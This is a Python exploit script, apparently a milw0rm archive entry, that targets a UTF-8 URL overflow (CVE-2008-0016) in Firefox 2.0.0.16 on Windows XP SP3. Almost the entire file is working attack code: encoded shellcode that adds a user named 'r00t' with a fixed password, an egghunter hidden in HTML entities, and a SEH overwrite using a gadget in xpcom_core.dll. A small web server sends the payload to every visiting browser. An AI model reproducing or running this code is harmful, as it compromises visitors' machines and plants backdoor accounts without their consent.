#!/usr/bin/python
# FireFox 2.0.0.16 Windows XP SP3 x86 Remote Exploit
# Author: Dominic Chell <dmc@deadbeef.co.uk>
#
# Exploits the UTF-8 URL overflow vulnerability described in CVE-2008-0016.
# As of September 2009 there are no public exploits for this vulnerability.
# However, according to securityfocus an exploit is available in both Canvas
# and Core Impact.
#
# Thanks to meta and ChrisA

from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

# Adduser shellcode encoded with shikata_ga_nai
# USER=r00t PASS=r00tr00t!!
egg = (
	"\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32"
	"\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4"
	"\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23"
	"\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43"
	"\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11"
	"\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a"
	"\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea"
	"\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6"
	"\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b"
	"\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16"
	"\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4"
	"\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49"
	"\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e"
	"\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21"
	"\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53")

# Egghunter where egg is 0x41424142.
# The egghunter is encoded as HTML entities, this evades the unicode conversion.
# Egghunter courtesy of skape. Modified to xor edx,edx as first instruction.
shellcode = (
	"&#xD233;&#x9090;&#x9090;&#x4290;&#x6a52;&#x5802;&#x2ecd;"
	"&#x053c;&#x745a;&#xb8ef;&#x4142;&#x4142;&#xfa8b;&#x75af;"
	"&#xafea;&#xe775;&#xe7ff;&#xcccc;&#xcccc;&#xcccc;&#xcccc;"
	"&#xcccc;&#xcccc;&#xcccc;&#xcccc;")

# The UTF-8 character in the URL triggers the code path where the overflow occurs.
s = "\xC3\xBA"
u = unicode(s, "utf-8")
utf8chars = u.encode( "utf-8" )

class myRequestHandler(BaseHTTPRequestHandler):

	def create_exploit_buffer(self):
		html = "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />\n<html>\n<body>\n"

		# Store the egg and adduser shellcode in CDATA
		# The egghunter will try and find this in memory
		html += "<!CDATA[" + "\x42\x41\x42\x41\x42\x41\x42\x41" + egg
		html += "]>\n"

		html += "<a href=\""
		html += "\x01"
		html += "xx://dmc"
		html += utf8chars
		html += "/"
		
		html += "&#x9090;" * 1700	# Windows XP SP3 SEH offset
		html += "&#4331;&#37008;"	# unicode - ptr to next seh "\xeb\x10\x90\x90";
		html += "&#x11e7;&#x6037;"	# 0x603711e7 - pop/pop/ret - xpcom_core.dll
		html +="&#x9090;" * 10
		html += shellcode # add egghunter
		html +="&#x9090;" * 10
		html += "\" >s</a>"
		html += "\n</body>"
		html += "\n</html>"
	
		return html

	def do_GET(self):
		self.printCustomHTTPResponse(200)
		if self.path == "/":
			target=self.client_address[0]
			html = self.create_exploit_buffer()
			self.wfile.write(html)
			print "[*] Evil payload sent\n[*] Wait a few minutes and try connecting with r00t/r00tr00t!!\n"
			
	def printCustomHTTPResponse(self, respcode):
		self.send_response(respcode)
		self.send_header("Content-type", "text/html")
		self.send_header("Server", "myRequestHandler")
		self.end_headers()

print "FireFox 2.0.0.16 x86 Exploit\nAuthor: dmc@deadbeef.co.uk\n"
print "[*] Starting evil web server"
print "[*] Waiting for clients\n"

httpd = HTTPServer(('', 80), myRequestHandler)

try:
	httpd.handle_request()
	httpd.serve_forever() 
except KeyboardInterrupt:
	print "\n\n[*] Interupt caught, exiting.\n\n"
	sys.exit(1)

# milw0rm.com [2009-09-14]
